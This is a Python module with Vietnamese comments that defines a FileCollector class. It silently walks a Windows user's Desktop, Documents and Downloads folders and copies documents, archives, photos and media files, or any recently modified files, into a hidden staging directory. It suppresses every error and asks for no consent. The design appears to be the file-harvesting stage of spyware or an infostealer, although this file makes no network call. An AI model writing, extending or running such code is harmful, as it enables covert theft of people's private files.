"""
Module thu thập file quan trọng từ máy tính
"""
import os
import shutil
from pathlib import Path
from datetime import datetime
from config import TEMP_DIR


class FileCollector:
    def __init__(self):
        self.temp_dir = os.path.join(TEMP_DIR, "collected_files")
        if not os.path.exists(self.temp_dir):
            os.makedirs(self.temp_dir)
        
        # Các thư mục quan trọng cần thu thập
        self.important_paths = [
            os.path.join(os.environ.get('USERPROFILE', ''), 'Desktop'),
            os.path.join(os.environ.get('USERPROFILE', ''), 'Documents'),
            os.path.join(os.environ.get('USERPROFILE', ''), 'Downloads'),
        ]
        
        # Các phần mở rộng file quan trọng
        self.important_extensions = [
            '.txt', '.doc', '.docx', '.pdf', '.xls', '.xlsx',
            '.ppt', '.pptx', '.zip', '.rar', '.7z',
            '.jpg', '.jpeg', '.png', '.gif', '.bmp',
            '.mp4', '.avi', '.mov', '.mp3', '.wav'
        ]
    
    def collect_files(self, max_files=50, max_size_mb=10):
        """
        Thu thập file quan trọng
        
        Args:
            max_files: Số file tối đa
            max_size_mb: Kích thước tối đa mỗi file (MB)
        
        Returns:
            list: Danh sách đường dẫn file đã thu thập
        """
        collected_files = []
        max_size_bytes = max_size_mb * 1024 * 1024
        
        try:
            for path in self.important_paths:
                if not os.path.exists(path):
                    continue
                
                for root, dirs, files in os.walk(path):
                    # Bỏ qua thư mục hệ thống
                    dirs[:] = [d for d in dirs if not d.startswith('.')]
                    
                    for file in files:
                        if len(collected_files) >= max_files:
                            return collected_files
                        
                        filepath = os.path.join(root, file)
                        
                        # Kiểm tra phần mở rộng
                        if not any(file.lower().endswith(ext) for ext in self.important_extensions):
                            continue
                        
                        # Kiểm tra kích thước
                        try:
                            file_size = os.path.getsize(filepath)
                            if file_size > max_size_bytes:
                                continue
                            
                            # Sao chép file
                            timestamp = datetime.now().strftime("%Y%m%d_%H%M%S")
                            dest_filename = f"{timestamp}_{file}"
                            dest_path = os.path.join(self.temp_dir, dest_filename)
                            
                            shutil.copy2(filepath, dest_path)
                            collected_files.append(dest_path)
                        except Exception:
                            continue
        except Exception:
            pass
        
        return collected_files
    
    def collect_recent_files(self, days=7, max_files=20):
        """
        Thu thập file được sửa đổi gần đây
        
        Args:
            days: Số ngày gần đây
            max_files: Số file tối đa
        
        Returns:
            list: Danh sách đường dẫn file
        """
        import time
        collected_files = []
        cutoff_time = time.time() - (days * 24 * 3600)
        
        try:
            for path in self.important_paths:
                if not os.path.exists(path):
                    continue
                
                for root, dirs, files in os.walk(path):
                    dirs[:] = [d for d in dirs if not d.startswith('.')]
                    
                    for file in files:
                        if len(collected_files) >= max_files:
                            return collected_files
                        
                        filepath = os.path.join(root, file)
                        
                        try:
                            mtime = os.path.getmtime(filepath)
                            if mtime < cutoff_time:
                                continue
                            
                            timestamp = datetime.now().strftime("%Y%m%d_%H%M%S")
                            dest_filename = f"{timestamp}_{file}"
                            dest_path = os.path.join(self.temp_dir, dest_filename)
                            
                            shutil.copy2(filepath, dest_path)
                            collected_files.append(dest_path)
                        except Exception:
                            continue
        except Exception:
            pass
        
        return collected_files


if __name__ == "__main__":
    collector = FileCollector()
    print("Đang thu thập file...")
    files = collector.collect_recent_files(days=1, max_files=10)
    print(f"Đã thu thập {len(files)} file")

